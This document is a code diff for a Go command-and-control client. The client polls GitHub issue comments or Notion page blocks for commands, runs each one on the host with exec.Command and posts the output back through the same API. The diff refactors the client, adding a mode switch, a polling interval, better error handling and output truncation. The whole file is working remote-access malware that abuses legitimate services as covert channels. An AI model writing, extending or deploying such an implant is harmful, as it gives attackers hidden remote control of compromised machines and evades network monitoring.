@@ -14,7 +14,6 @@ import (
 
 var (
 	access_token string
-	commentURI   string
 	repo_name    string
 	owner        string
 	issuenumber  string
@@ -22,99 +21,94 @@ var (
 	cmd          string
 )
 
-func github_logic() {
-	owner = os.Args[1]
-	repo_name = os.Args[2]
-	access_token = os.Args[3]
-	issuenumber = os.Args[4]
+func github_logic(interval int) {
+	if len(os.Args) < 5 {
+		fmt.Println("Usage: client github <owner> <repo> <token> <issue_number> [interval]")
+		return
+	}
+	owner = os.Args[2]
+	repo_name = os.Args[3]
+	access_token = os.Args[4]
+	issuenumber = os.Args[5]
 	var prev_command string
-	prev_command = ""
 
 	client := &http.Client{}
 
-	fmt.Println("[+] Client Started!")
+	fmt.Println("[+] GitHub Client Started!")
 
 	for {
+		time.Sleep(time.Duration(interval) * time.Second)
 
-		time.Sleep(5 * time.Second)
-
-		//reading command from github
-
-		commentURI := "https://api.github.com/repos/" + owner + "/" + repo_name + "/issues/" + issuenumber + "/comments"
+		commentURI := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s/comments", owner, repo_name, issuenumber)
 
 		req, _ := http.NewRequest("GET", commentURI, nil)
 		req.Header.Add("Authorization", "Bearer "+access_token)
 		req.Header.Add("Accept", "application/vnd.github+json")
 
 		response, err := client.Do(req)
-
 		if err != nil {
-			fmt.Println("[-] Error in reading : ", err)
-			return
-		}
-
-		body, _ := io.ReadAll(response.Body)
-		json.Unmarshal(body, &output)
-
-		if len(output) == 0 {
-			fmt.Println("[*] No Command Receviced")
+			fmt.Println("[-] Error in reading from GitHub: ", err)
 			continue
 		}
 
-		if prev_command != output[len(output)-1]["body"].(string) {
+		body, _ := io.ReadAll(response.Body)
+		response.Body.Close()
 
-			fmt.Println("[+] Command Received : ", output[len(output)-1]["body"].(string))
+		var comments []map[string]interface{}
+		if err := json.Unmarshal(body, &comments); err != nil {
+			fmt.Println("[-] JSON Unmarshal error:", err)
+			continue
+		}
 
-			cmd = output[len(output)-1]["body"].(string)
-			tokens := strings.Fields(cmd)
+		if len(comments) == 0 {
+			continue
+		}
 
+		lastComment, ok := comments[len(comments)-1]["body"].(string)
+		if !ok {
+			continue
+		}
+
+		if prev_command != lastComment {
+			fmt.Println("[+] New command received:", lastComment)
+			prev_command = lastComment
+
+			tokens := strings.Fields(lastComment)
+			if len(tokens) == 0 {
+				continue
+			}
+
+			// Execute command
 			result := exec.Command(tokens[0], tokens[1:]...)
+			cmd_output, err := result.CombinedOutput()
 
-			// Capture the output
-			cmd_output, err := result.Output()
+			responseStr := string(cmd_output)
 			if err != nil {
-				fmt.Println("[-] Error in execution :", err.Error())
-				BodyC2 := map[string]string{
-					"body": err.Error(),
-				}
-				bodyC, _ := json.Marshal(BodyC2)
-				req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
-				req2.Header.Add("Authorization", "Bearer "+access_token)
-				req2.Header.Add("Accept", "application/vnd.github+json")
-				_, err3 := client.Do(req2)
-				if err3 != nil {
-					fmt.Println("[-] Error in wrting to github")
-				}
-				prev_command = err.Error()
-				continue
-			} else {
-				fmt.Println("[+] Command Output : ", string(cmd_output))
+				responseStr = fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), responseStr)
 			}
 
-			//writing command output to github
-
-			BodyC := map[string]string{
-				"body": string(cmd_output),
-			}
-			bodyC, _ := json.Marshal(BodyC)
-
-			req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
-			req2.Header.Add("Authorization", "Bearer "+access_token)
-			req2.Header.Add("Accept", "application/vnd.github+json")
-
-			_, err2 := client.Do(req2)
-			if err2 != nil {
-				fmt.Println("[-] Error in execution :", err)
-				continue
-			} else {
-				fmt.Println("[+] Output Written to gihub")
-			}
-			prev_command = string(cmd_output)
-		} else {
-			fmt.Println("[*] No Command Recevied")
+			// Write output back
+			writeOutputToGithub(client, commentURI, responseStr)
+			prev_command = responseStr
 		}
 	}
+}
 
+func writeOutputToGithub(client *http.Client, uri string, content string) {
+	bodyMap := map[string]string{"body": content}
+	jsonBody, _ := json.Marshal(bodyMap)
+
+	req, _ := http.NewRequest("POST", uri, bytes.NewBuffer(jsonBody))
+	req.Header.Add("Authorization", "Bearer "+access_token)
+	req.Header.Add("Accept", "application/vnd.github+json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("[-] Error writing output to GitHub:", err)
+		return
+	}
+	resp.Body.Close()
+	fmt.Println("[+] Output sent to GitHub.")
 }
 
 type TextContent struct {
@@ -140,29 +134,27 @@ type Payload struct {
 	Children []Block `json:"children"`
 }
 
-func notion_logic() {
-
-	integeration_token := os.Args[1]
+func notion_logic(interval int) {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: client notion <token> <page_id> [interval]")
+		return
+	}
+	integration_token := os.Args[1]
 	page_id := os.Args[2]
 
-	var output map[string]interface{}
 	var lastBlockID string
-
 	url := "https://api.notion.com/v1/blocks/" + page_id + "/children"
 
-	fmt.Println("[+] NotionC2 client started.")
+	fmt.Println("[+] Notion C2 client started.")
 
 	for {
-
-		time.Sleep(5 * time.Second)
+		time.Sleep(time.Duration(interval) * time.Second)
 
 		req, _ := http.NewRequest("GET", url, nil)
-
 		req.Header.Set("Notion-Version", "2022-06-28")
-		req.Header.Set("Authorization", "Bearer "+integeration_token)
+		req.Header.Set("Authorization", "Bearer "+integration_token)
 
 		res, err := http.DefaultClient.Do(req)
-
 		if err != nil {
 			fmt.Println("[-] Error reading from Notion:", err)
 			continue
@@ -171,67 +163,76 @@ func notion_logic() {
 		body, _ := io.ReadAll(res.Body)
 		res.Body.Close()
 
-		json.Unmarshal(body, &output)
-
-		blocks := output["results"].([]interface{})
-
-		if len(blocks) == 0 {
-			fmt.Println("[-] No Command")
+		var notionResp map[string]interface{}
+		if err := json.Unmarshal(body, &notionResp); err != nil {
 			continue
 		}
 
-		block := blocks[len(blocks)-1].(map[string]interface{})
-		blockID := block["id"].(string)
+		results, ok := notionResp["results"].([]interface{})
+		if !ok || len(results) == 0 {
+			continue
+		}
 
-		// Skip if we already executed this block
+		lastBlock := results[len(results)-1].(map[string]interface{})
+		blockID, _ := lastBlock["id"].(string)
+
 		if blockID == lastBlockID {
-			fmt.Println("[!] No new command")
 			continue
 		}
 
 		lastBlockID = blockID
 
-		if block["type"] != "paragraph" {
-			fmt.Println("[-] Block type not paragraph")
+		if lastBlock["type"] != "paragraph" {
 			continue
 		}
 
-		paragraph := block["paragraph"].(map[string]interface{})
-		rich := paragraph["rich_text"].([]interface{})
-
-		if len(rich) == 0 {
-			fmt.Println("[-] Empty command")
+		para, ok := lastBlock["paragraph"].(map[string]interface{})
+		if !ok {
+			continue
+		}
+		rich, ok := para["rich_text"].([]interface{})
+		if !ok || len(rich) == 0 {
 			continue
 		}
 
-		text := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"].(string)
+		// Safely extract text
+		firstRich, ok := rich[0].(map[string]interface{})
+		if !ok {
+			continue
+		}
+		textData, ok := firstRich["text"].(map[string]interface{})
+		if !ok {
+			continue
+		}
+		commandText, ok := textData["content"].(string)
+		if !ok {
+			continue
+		}
 
-		fmt.Println("[+] Received Command:", text)
+		fmt.Println("[+] Received command:", commandText)
 
-		tokens := strings.Fields(text)
-
+		tokens := strings.Fields(commandText)
 		if len(tokens) == 0 {
-			fmt.Println("[-] Invalid command")
 			continue
 		}
 
+		// Execute
 		process := exec.Command(tokens[0], tokens[1:]...)
+		output, cmdErr := process.CombinedOutput()
 
-		out, cmdErr := process.Output()
-
+		responseContent := string(output)
 		if cmdErr != nil {
-			fmt.Println("[+] Command execution error:", cmdErr)
-			out = []byte(cmdErr.Error())
+			responseContent = fmt.Sprintf("Error: %s\n%s", cmdErr.Error(), responseContent)
 		}
 
-		content := string(out)
-
-		if len(content) > 1900 {
-			content = content[:1900]
+		// Notion has a 2000 char limit per block
+		if len(responseContent) > 1950 {
+			responseContent = responseContent[:1950] + "... [truncated]"
 		}
 
-		fmt.Println("[+] Command Output:", content)
+		fmt.Println("[+] Executed. Sending output...")
 
+		// Build response payload
 		payloadStruct := Payload{
 			Children: []Block{
 				{
@@ -242,7 +243,7 @@ func notion_logic() {
 							{
 								Type: "text",
 								Text: TextContent{
-									Content: content,
+									Content: responseContent,
 								},
 							},
 						},
@@ -251,36 +252,56 @@ func notion_logic() {
 			},
 		}
 
-		jsonPayload, err := json.Marshal(payloadStruct)
-
-		if err != nil {
-			fmt.Println("[-] JSON Encoding Error:", err)
-			continue
-		}
-
-		payload := bytes.NewBuffer(jsonPayload)
-
-		req2, _ := http.NewRequest("PATCH", url, payload)
-
+		jsonPayload, _ := json.Marshal(payloadStruct)
+		req2, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonPayload))
 		req2.Header.Set("Notion-Version", "2022-06-28")
-		req2.Header.Set("Authorization", "Bearer "+integeration_token)
+		req2.Header.Set("Authorization", "Bearer "+integration_token)
 		req2.Header.Set("Content-Type", "application/json")
 
 		res2, err := http.DefaultClient.Do(req2)
-
 		if err != nil {
-			fmt.Println("[-] Error writing output:", err)
+			fmt.Println("[-] Error writing to Notion:", err)
 			continue
 		}
 
-		respBody, _ := io.ReadAll(res2.Body)
+		// Update our lastBlockID with the response ID so we don't process it as a command
+		body2, _ := io.ReadAll(res2.Body)
 		res2.Body.Close()
-
-		fmt.Println("[+] Output sent to Notion")
-		fmt.Println(string(respBody))
+		var patchResp map[string]interface{}
+		json.Unmarshal(body2, &patchResp)
+		if patchResults, ok := patchResp["results"].([]interface{}); ok && len(patchResults) > 0 {
+			lastBlockID, _ = patchResults[len(patchResults)-1].(map[string]interface{})["id"].(string)
+			fmt.Println("[+] Output block ID:", lastBlockID)
+		}
 	}
 }
 
 func main() {
-	notion_logic()
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: client <notion|github> [args...]")
+		return
+	}
+
+	mode := os.Args[1]
+	interval := 10
+	if mode == "github" {
+		if len(os.Args) >= 7 {
+			fmt.Sscanf(os.Args[6], "%d", &interval)
+		}
+		github_logic(interval)
+	} else if mode == "notion" {
+		// Expecting: client notion <token> <page_id> [interval]
+		if len(os.Args) >= 4 {
+			if len(os.Args) >= 5 {
+				fmt.Sscanf(os.Args[4], "%d", &interval)
+			}
+			os.Args = os.Args[1:] // Shift args so notion_logic sees them at 1 and 2
+			notion_logic(interval)
+		} else {
+			fmt.Println("Usage: client notion <token> <page_id> [interval]")
+		}
+	} else {
+		// Backward compatibility fallback for direct token/id
+		notion_logic(interval)
+	}
 }
